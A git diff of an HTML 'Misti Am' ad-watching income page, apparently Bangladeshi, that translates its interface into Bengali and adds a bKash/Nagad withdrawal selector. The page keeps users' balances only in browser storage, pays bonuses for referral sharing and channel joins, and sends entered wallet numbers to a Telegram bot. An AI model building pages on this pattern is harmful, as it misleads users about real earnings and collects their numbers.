@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Misti Am - Income</title>
+    <title>মিষ্টি আম - ইনকাম</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
@@ -32,36 +32,43 @@
         .wd-btn { background: #2980b9; color: #fff; width: 100%; padding: 12px; margin-top: 10px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
         .wd-btn:disabled { background: #bdc3c7; color: #666; cursor: not-allowed; }
         .share-btn { text-decoration: none; color: #fff; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 14px; display: block; cursor: pointer; margin-top: 10px; width: 100%; border: none; }
+        input, select { width: 90%; padding: 10px; margin-top: 5px; border-radius: 8px; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>Misti Am 🥭💰</h1>
+    <h1>মিষ্টি আম 🥭💰</h1>
     <div class="balance-card">
-        <p style="margin:0;">Mot Balance</p>
+        <p style="margin:0;">মোট ব্যালেন্স</p>
         <div class="balance"><span id="bl">0</span> ৳</div>
-        <p style="margin:0; font-size: 12px; color: #666;">ID: #<span id="uid">...</span></p>
+        <p style="margin:0; font-size: 12px; color: #666;">আইডি: #<span id="uid">...</span></p>
     </div>
 
-    <strong>📺 Ajker 10-ti Ad:</strong>
+    <strong>📺 আজকের ১০টি অ্যাড:</strong>
     <div id="adGrid" class="ad-grid"></div>
 
     <div class="action-section">
-        <strong>📢 Refer & Share (10৳)</strong>
-        <button onclick="shareWhatsApp()" class="share-btn" style="background: #25d366;">WhatsApp Share</button>
-        <button onclick="shareTelegram()" class="share-btn" style="background: #0088cc;">Telegram Share</button>
+        <strong>📢 রেফার করলে ১০ টাকা বোনাস</strong>
+        <p style="font-size: 11px; margin: 5px 0;">রেফার লিঙ্ক শেয়ার করে ইনকাম করুন!</p>
+        <button onclick="shareWhatsApp()" class="share-btn" style="background: #25d366;">WhatsApp শেয়ার করুন</button>
+        <button onclick="shareTelegram()" class="share-btn" style="background: #0088cc;">Telegram শেয়ার করুন</button>
     </div>
 
     <div class="action-section" id="joinSection" style="background: #fff0f0; border-color: #ff4d4d;">
-        <strong>🎁 Join Bonus 10৳</strong>
-        <a href="https://t.me/mistiam5" target="_blank" class="share-btn" style="background:#0088cc;" onclick="giveJoinBonus()">Channel-e Join Kore 10৳ Nin</a>
+        <strong>🎁 টেলিগ্রাম জয়েন করে ১০ টাকা পান</strong>
+        <p style="font-size: 11px; margin: 5px 0;">আমাদের চ্যানেলে জয়েন করলেই পাবেন ১০ টাকা বোনাস!</p>
+        <a href="https://t.me/mistiam5" target="_blank" class="share-btn" style="background:#0088cc;" onclick="giveJoinBonus()">টেলিগ্রাম চ্যানেলে জয়েন করুন</a>
     </div>
 
     <div class="action-section">
-        <strong>💳 Withdrawal</strong>
-        <input type="number" id="wdNumber" placeholder="Number din" style="width:90%; padding:10px; margin-top:5px; border-radius: 8px; border: 1px solid #ccc;">
-        <button id="wb" class="wd-btn" onclick="processWD()" disabled>Withdraw (Min 500৳)</button>
+        <strong>💳 টাকা উত্তোলন (Withdraw)</strong>
+        <select id="method">
+            <option value="bKash">বিকাশ (Personal)</option>
+            <option value="Nagad">নগদ (Personal)</option>
+        </select>
+        <input type="number" id="wdNumber" placeholder="আপনার নম্বর দিন">
+        <button id="wb" class="wd-btn" onclick="processWD()" disabled>উইথড্র করুন (মিনিমাম ৫০০৳)</button>
     </div>
 </div>
 
@@ -84,11 +91,11 @@
     const refLink = `https://ddjdjdjdjdjdjdjdjdjdj-ops.github.io/income/?ref=${myID}`;
 
     function shareWhatsApp() {
-        window.open(`https://wa.me/?text=${encodeURIComponent("Join korun ar 10tk bonus nin: " + refLink)}`);
+        window.open(`https://wa.me/?text=${encodeURIComponent("মিষ্টি আম অ্যাপে জয়েন করুন আর ১০ টাকা বোনাস নিন! লিঙ্ক: " + refLink)}`);
     }
 
     function shareTelegram() {
-        window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("Misti Am - Income Bot!")}`);
+        window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("মিষ্টি আম থেকে ইনকাম শুরু করুন!")}`);
     }
 
     function giveJoinBonus() {
@@ -96,8 +103,8 @@
             b += 10;
             updateBalance();
             localStorage.setItem('joined', 'true');
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("🎁 User #"+myID+" channel-e join kore 10tk bonus niyeche!")}`);
-            alert("10 tk bonus add hoyeche!");
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("🎁 ইউজার #"+myID+" চ্যানেলে জয়েন করে ১০৳ বোনাস নিয়েছে!")}`);
+            alert("১০ টাকা জয়েন বোনাস যোগ হয়েছে!");
             location.reload();
         }
     }
@@ -109,12 +116,13 @@
     }
 
     function processWD() {
+        const method = document.getElementById('method').value;
         const num = document.getElementById('wdNumber').value;
-        if(!num) { alert("Number din!"); return; }
-        const text = `💰 New Withdraw Request!\nID: #${myID}\nNumber: ${num}\nAmount: ${b} ৳`;
+        if(!num) { alert("নম্বর দিন!"); return; }
+        const text = `💰 নতুন উইথড্র রিকোয়েস্ট!\nআইডি: #${myID}\nমেথড: ${method}\nনম্বর: ${num}\nপরিমাণ: ${b} ৳`;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(text)}`)
         .then(() => {
-            alert("Request Telegram-e pathano hoyeche!");
+            alert("আপনার উইথড্র রিকোয়েস্ট টেলিগ্রামে পাঠানো হয়েছে!");
             b = 0;
             updateBalance();
             location.reload();
@@ -127,8 +135,8 @@
         for (let i = 0; i < 10; i++) {
             const btn = document.createElement('button');
             btn.className = 'ad-btn';
-            btn.innerText = `Ad ${i + 1}`;
-            if (localStorage.getItem(`ad_${i}`) === today) { btn.disabled = true; btn.innerText = "Done ✅"; }
+            btn.innerText = `অ্যাড ${i + 1}`;
+            if (localStorage.getItem(`ad_${i}`) === today) { btn.disabled = true; btn.innerText = "দেখা শেষ ✅"; }
             btn.onclick = () => {
                 window.open(adLinks[i], '_blank');
                 setTimeout(() => {
@@ -146,5 +154,5 @@
     createButtons();
 </script>
 </body>
-            </html>
-            
+    </html>
+    
